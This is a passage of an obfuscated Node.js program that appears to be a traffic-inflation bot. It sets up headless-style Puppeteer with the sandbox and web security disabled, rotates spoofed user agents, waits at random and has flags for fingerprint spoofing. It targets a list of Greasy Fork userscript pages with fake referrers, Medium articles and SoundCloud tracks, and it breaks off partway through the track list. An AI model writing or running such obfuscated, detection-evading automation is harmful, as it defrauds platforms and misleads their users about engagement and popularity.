const a1 = c,
  a0 = b,
  Z = d;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1da6 + -0x22 + -0x1d84);
    let h = e[f];
    if (b['KyRShL'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x21c5 + 0x3 * -0x108 + -0x1ead * 0x1, s, t, u = -0x19b5 + -0x14f9 + -0x19 * -0x1de; t = n['charAt'](u++); ~t && (s = r % (-0xbe + 0x9f7 + -0x1 * 0x935) ? s * (0x1 * -0xf85 + -0x1a0d + -0x1 * -0x29d2) + t : t, r++ % (-0x1e2d + 0x111 + 0x1d20)) ? p += String['fromCharCode'](-0x31e * 0x4 + -0x1a06 + 0xb * 0x397 & s >> (-(-0x139 + 0x26ac + -0x2571) * r & 0x1d7 * -0xd + 0x56 + 0x179b * 0x1)) : -0x58 * -0x39 + -0x1 * 0x641 + -0x5 * 0x2ab) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * -0x7b0 + 0x1226 + -0xa76, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x22f + 0x1f29 + -0x2148))['slice'](-(0x18e9 + -0xfc7 * -0x2 + -0x3875));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0x2330 + -0xc92 + -0x17e1 * -0x2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xa22 + -0x1afc + 0x86d * 0x2; u < -0x1232 + 0xb * 0x1fa + -0x28c; u++) {
          p[u] = u;
        }
        for (u = -0x20e9 * 0x1 + 0x2 * -0x196 + 0x2415; u < 0x26 * -0x37 + -0xf63 + 0x5 * 0x4e9; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x139b + -0x68e + -0x1 * 0xc0d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x3 * -0x51a + -0x1d31 + -0x3 * -0xed5, q = -0x1ec3 + 0x3 * 0x50d + 0xf9c;
        for (let v = -0xcb3 * 0x2 + -0x11ba + 0x2b20; v < n['length']; v++) {
          u = (u + (0x1163 * 0x2 + 0x156 * -0x4 + -0x1d6d)) % (-0x26c5 + -0x2d8 * -0xb + 0x87d), q = (q + p[u]) % (0xbfe + 0x1e57 + -0x2955), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2b3 * 0x8 + -0x49 * -0x19 + 0xf77)]);
        }
        return t;
      };
      b['KLjRMF'] = m, c = arguments, b['KyRShL'] = !![];
    }
    const j = e[-0x1c78 + 0x1 * 0x1654 + 0x6 * 0x106],
      k = f + j,
      l = c[k];
    return !l ? (b['cMlkEP'] === undefined && (b['cMlkEP'] = !![]), h = b['KLjRMF'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const aT = [
    'x3nOyxjPBMC',
    'ole-of-js-',
    'DIRdRSoosmoRamkzW7zq',
    'lwXPzNqTD2vIlq',
    'syn_52523/',
    'W4/dV8k5ySkrW4FcSSk+W5/dNG',
    'WOTgqCo0bu8c',
    'Mozilla/5.',
    'ampaign=so',
    'blocks',
    '36-zhihu-l',
    'sume',
    '.user.js',
    '-live-chat',
    'WRvmn8kZW7rcWQfXFa',
    'rg/scripts',
    'W4FdJCozwZBdRCktmhys',
    '.36',
    'https://gr',
    'l01bwdmWl2jVBG',
    'yxn0lwfUzc1TBW'
  ];
  a = function() {
    return aT;
  };
  return a();
}

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (-0xbe + 0x9f7 + -0x4 * 0x24e))) + h;
}
async function randomWait() {
  return await wait(0x1 * -0xf85 + -0x1a0d + -0x2 * -0x1e8d + (-0x1e2d + 0x111 + 0x30a4) * random()), -0x31e * 0x4 + -0x1a06 + 0x2d * 0xdb;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = -0x2ee + 0x5cd0 + -0x2b02 + (0x1d7 * -0xd + 0x56 + 0x234d * 0x1) * random(),
  MM_NETWORK_PATIENCE = (-0x58 * -0x39 + -0x1 * 0x641 + -0x4 * 0x355) * NETWORK_PATIENCE,
  me = random()['toString'](0x1 * -0x7b0 + 0x1226 + -0xa66)['substring'](0x22f + 0x1f29 + -0x2154, 0x18e9 + -0xfc7 * -0x2 + -0x386d),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': Z(0x12) + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + Z(0xa) + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + a0(0xe, 'LFUn'),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + Z(0xd) + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + Z(0xb),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + a1(0x3) + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + a1(0x14) + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Z(0x11),
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + Z(0x4) + 'a-rabbit-h' + Z(0x1) + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + a1(0x0),
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
